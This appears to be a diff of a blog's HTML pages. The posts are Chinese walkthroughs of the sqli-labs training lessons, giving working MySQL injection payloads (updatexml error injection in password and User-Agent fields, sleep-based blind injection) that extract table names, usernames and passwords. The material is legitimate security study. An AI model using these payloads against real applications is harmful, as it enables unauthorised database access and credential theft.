+<p>后续的爆表，爆列等也是这样，构造payload然后比对页面返回得结果。不多赘述。</p>
+<h2 id="解法三-时间盲注："><a href="#解法三-时间盲注：" class="headerlink" title="解法三.时间盲注："></a>解法三.时间盲注：</h2><p>时间注入可以利用句式一或者句式二。在这里我们就简单的拿爆库举个例子，剩下的参考时间盲注那一关的笔记。</p>
+<p>爆库：?sort=if(mid(database(),1,8)=’security’,1,sleep(5))</p>
+<h2 id="lesson47："><a href="#lesson47：" class="headerlink" title="lesson47："></a>lesson47：</h2><p>和lesson46一样，注意注入类型的变化做出适当改变（包括句式的改变还有添加注释符等）即可。</p>
+<h2 id="lesson48："><a href="#lesson48：" class="headerlink" title="lesson48："></a>lesson48：</h2><p>同lesson46，但是页面不再出现报错回显，故报错注入不可用。</p>
+<h2 id="lesson49："><a href="#lesson49：" class="headerlink" title="lesson49："></a>lesson49：</h2><p>同lesson47，但是页面不再出现报错回显，故报错注入不可用。</p>
+<h2 id="lesson50、51、52-、53："><a href="#lesson50、51、52-、53：" class="headerlink" title="lesson50、51、52 、53："></a>lesson50、51、52 、53：</h2><p>就是之前学的堆叠注入加上新学的order by后的注入，没什么新颖的，打组合拳就好了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/07/lesson46-53/" data-id="ckkxxdafe0002rgvucpre1n88" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-lesson38-45" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/06/lesson38-45/" class="article-date">
@@ -568,217 +1018,6 @@
 
 
   
-    <article id="post-HPPT协议" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/02/HPPT%E5%8D%8F%E8%AE%AE/" class="article-date">
-  <time datetime="2021-02-02T14:56:16.000Z" itemprop="datePublished">2021-02-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/02/HPPT%E5%8D%8F%E8%AE%AE/">HPPT协议</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/.com//1.png" alt="1"></p>
-<p><img src="/.com//2.png" alt="2"></p>
-<p><img src="/.com//3.png" alt="3"></p>
-<p><img src="/.com//4.png" alt="4"></p>
-<p><img src="/.com//5.png" alt="5"></p>
-<p><img src="/.com//6.png" alt="6"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/02/HPPT%E5%8D%8F%E8%AE%AE/" data-id="ckkrqc5c00003n4vu5gxt55y5" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HPPT/" rel="tag">HPPT</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-lesson18-20" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/01/lesson18-20/" class="article-date">
-  <time datetime="2021-02-01T12:33:49.000Z" itemprop="datePublished">2021-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/01/lesson18-20/">lesson18-20</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="lesson18："><a href="#lesson18：" class="headerlink" title="lesson18："></a>lesson18：</h3><p>这一题看过去和lesson17没什么差别，就多了一行id地址，我们查看源码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]);</span><br><span class="line">$passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br></pre></td></tr></table></figure>
-
-<p>可知，数据库对输入的username和password都做了过滤，所以我们想通过页面输入获取数据库信息的方法肯定是走不通了。我们再看源码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p>源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分: User-Agent 。<br>而获取IP则使用了RENOTE_ADDR，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但修改XFF头就可以更改的。我们继续往下看：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>从这里我们可以看到我们的uagent等会被带入到数据库中，那么我们好像可以通过对uagent进行改写，构造payload。</p>
-<p>然后我们现在在页面输入正确账号密码后，发现页面回显：<img src="/.com//1.png" alt="1"></p>
-<p>那么我们更可以确定是对User-Agent 下手。</p>
-<p>通过第三段源码我们可以得知注入类型为：’  ;</p>
-<p>于是我们可以开始用burp suite抓包：<img src="/.com//2.png" alt="2"></p>
-<h5 id="payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1"><a href="#payload模板：’-or-updatexml-1-concat-‘-’-clause-’-’-1-1-1" class="headerlink" title="payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#"></a>payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#</h5><p>其中clase为想要查询的子句；源码的insert语句中原本有三个参数（用三个1表示）——（1，1*，1**），然后1被<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>  替换，后面1*和1**是为了和insert语句中参数数量一致，否则会报错：<img src="/.com//7.png" alt="7"></p>
-<p>当updatexml函数报错以后，数据库就不会去检查1*和1**了。</p>
-<p>注：<code>&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) </code>带入到源码中 <code>&#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)</code>，第一处合并是空，所以uagent把updatexml函数的值带入数据库。</p>
-<h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>Forword，得：<img src="/.com//3.png" alt="3"></p>
-<h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>Forword，得：<img src="/.com//4.png" alt="4"></p>
-<p>注：因为我之前在security数据库里创了表，现在导致表太多了，而报错的长度有限，不能查到所有表。然后我想用limit函数限制查询数量，但是我尝试了好久没有成功，先留个坑吧！！！！！！！！！！！！！！！！！！</p>
-<h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>Forword，得：</p>
-<p><img src="/.com//5.png" alt="5"></p>
-<h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>网页输入正确账号密码，burp抓包，在User-Agent一行构造payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;<span class="comment">#&#x27;),1),1,1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>Forword，得：</p>
-<p><img src="/.com//6.png" alt="6"></p>
-<h3 id="lesson19："><a href="#lesson19：" class="headerlink" title="lesson19："></a>lesson19：</h3><p>这一关和lesson18差不多，只不过改在Referer处写payload。</p>
-<h3 id="lesson20："><a href="#lesson20：" class="headerlink" title="lesson20："></a>lesson20：</h3><p>这一关和lesson18也是类似，不过在cookie处写payload，而且因为当输入正确账号密码的时候，网页会回显，所以也可以采用union联合注入。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/01/lesson18-20/" data-id="ckkrqc5ck0019n4vu0xli71l2" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-lesson17" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/31/lesson17/" class="article-date">
-  <time datetime="2021-01-31T13:26:30.000Z" itemprop="datePublished">2021-01-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/31/lesson17/">lesson17</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="lesson17："><a href="#lesson17：" class="headerlink" title="lesson17："></a>lesson17：</h1><p>这一关不管我们在username上构造什么payload都无法篡改数据库。</p>
-<p>我们查看源码：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="先认识一下陌生函数："><a href="#先认识一下陌生函数：" class="headerlink" title="先认识一下陌生函数："></a>先认识一下陌生函数：</h4><h5 id="1-get-magic-quotes-gpc-函数"><a href="#1-get-magic-quotes-gpc-函数" class="headerlink" title="1.get_magic_quotes_gpc()函数"></a>1.get_magic_quotes_gpc()函数</h5><p>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p>
-<p>注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。</p>
-<h5 id="2-addslashes-函数"><a href="#2-addslashes-函数" class="headerlink" title="2.addslashes()函数"></a>2.addslashes()函数</h5><p>addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\的字符串。</p>
-<h5 id="3-stripslashes-函数"><a href="#3-stripslashes-函数" class="headerlink" title="3.stripslashes()函数"></a>3.stripslashes()函数</h5><p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
-<p>注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。</p>
-<h5 id="4-ctype-digit-函数"><a href="#4-ctype-digit-函数" class="headerlink" title="4.ctype_digit()函数"></a>4.ctype_digit()函数</h5><p>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
-<h5 id="5-mysql-real-escape-string-函数"><a href="#5-mysql-real-escape-string-函数" class="headerlink" title="5.mysql_real_escape_string()函数"></a>5.mysql_real_escape_string()函数</h5><p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/.com//1.png" alt="1"></p>
-<p><strong>sp：</strong>怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。</p>
-<p>我们观察源码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以转变思路可以从password下手。</p>
-<p>输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’  ;</p>
-<p><strong>！这里介绍一个注入方法：</strong></p>
-<h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3><h5 id="A-常用函数："><a href="#A-常用函数：" class="headerlink" title="A.常用函数："></a>A.常用函数：</h5><h6 id="1-updatexml-函数："><a href="#1-updatexml-函数：" class="headerlink" title="1.updatexml()函数："></a>1.updatexml()函数：</h6><p>updatexml(xml_doc,xpath,new_value)函数有三个参数，分别是(xml_document, XPath_string, new_value)—-</p>
-<p>第一个参数：xml_document， String格式，为XML文档对象的名称；</p>
-<p>第二个参数：XPath_string (Xpath格式的字符串)；</p>
-<p>第三个参数：new_value， String格式，替换查找到的符合条件的数据；</p>
-<p>该函数的作用就是把xml文档中的指定字符串替换成新值。</p>
-<p><img src="/.com//2.png" alt="2"></p>
-<h6 id="2-extractvalue-函数："><a href="#2-extractvalue-函数：" class="headerlink" title="2.extractvalue()函数："></a>2.extractvalue()函数：</h6><p>extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。</p>
-<h5 id><a href="#" class="headerlink" title></a><img src="/.com//3.png" alt="3"></h5><h5 id="B-报错注入原理："><a href="#B-报错注入原理：" class="headerlink" title="B.报错注入原理："></a>B.报错注入原理：</h5><p>(1)参数xpath需要的是xpath格式的字符串，不是就会报错。</p>
-<p>(2))当xpath路径语法错误时，就会报错。</p>
-<p>注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。</p>
-<p>懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。</p>
-<h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=(anything)&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;, database()),1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>得：<img src="/.com//4.png" alt="4"></p>
-<p>注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。</p>
-<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>得：<img src="/.com//5.png" alt="5"></p>
-<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
-
-<p>得：<img src="/.com//6.png" alt="6"></p>
-<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>得：<img src="/.com//7.png" alt="7"></p>
-<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.爆值的时候需要注意，不能直接用简单的<code>select concat(username)</code>，这样会引起报错：<img src="/.com//8.png" alt="8"></p>
-<p>原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。</p>
-<p><img src="/.com//9.png" alt="9"></p>
-<p>2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制</p>
-<p>回显内容。</p>
-<p><strong>sp：回顾一下字符串连接函数</strong></p>
-<p><strong>1.concat(str1,str2,…)——没有分隔符地连接字符串</strong><br><strong>2.concat_ws(‘separator’,str1,str2,…)——含有分隔符地连接字符串</strong><br><strong>3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</strong></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/lesson17/" data-id="ckkrqc5cj0017n4vu2qqk3fn5" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -807,7 +1046,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 16px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 18px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 14px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 16px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 18px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 14px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
     </div>
   </div>
 
@@ -829,23 +1068,23 @@
       <ul>
         
           <li>
-            <a href="/2021/04/05/buuctf/">buuctf</a>
+            <a href="/2021/04/13/buuctf2/">buuctf2</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/07/bugku2/">bugukuu2</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/05/buuctf1/">buuctf</a>
           </li>
         
           <li>
             <a href="/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则匹配</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/18/DVWA%E2%80%94JS/">JS</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/18/DVWA%E2%80%94CSP/">CSP</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/16/bugku/">bugku(1)</a>
           </li>
         
       </ul>
